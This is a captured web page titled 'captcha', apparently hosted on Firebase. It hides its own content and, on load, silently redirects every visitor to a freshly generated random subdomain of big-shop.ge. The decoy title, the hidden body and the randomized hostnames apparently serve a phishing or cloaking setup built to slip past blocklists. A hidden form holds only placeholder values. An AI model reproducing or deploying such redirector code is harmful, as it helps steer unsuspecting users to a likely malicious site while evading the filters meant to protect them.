@@ -1,0 +1,40 @@
+<!-- url: https://switzerlandu.web.app/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>captcha</title>
+    <style>
+        body {
+            display: none; /* Hide the body content */
+        }
+    </style>
+    <script>
+        // Function to generate a random 32-character hexadecimal string
+        function generateRandomHex(length) {
+            const characters = '0123456789abcdef';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Generate a random subdomain in hexadecimal format
+        const randomSubdomain = generateRandomHex(32); // 32-character hex string
+        const redirectUrl = `https://id4${randomSubdomain}.big-shop.ge/ch`;
+
+        // Redirect to the generated URL
+        window.location.href = redirectUrl;
+    </script>
+</head>
+<body>
+    <form id="autoForm" style="display:none;">
+        <input type="text" id="name" name="name" value="John Doe">
+        <input type="email" id="email" name="email" value="john@example.com">
+        <textarea id="message" name="message">Sample message</textarea>
+    </form>
+</body>
+</html>
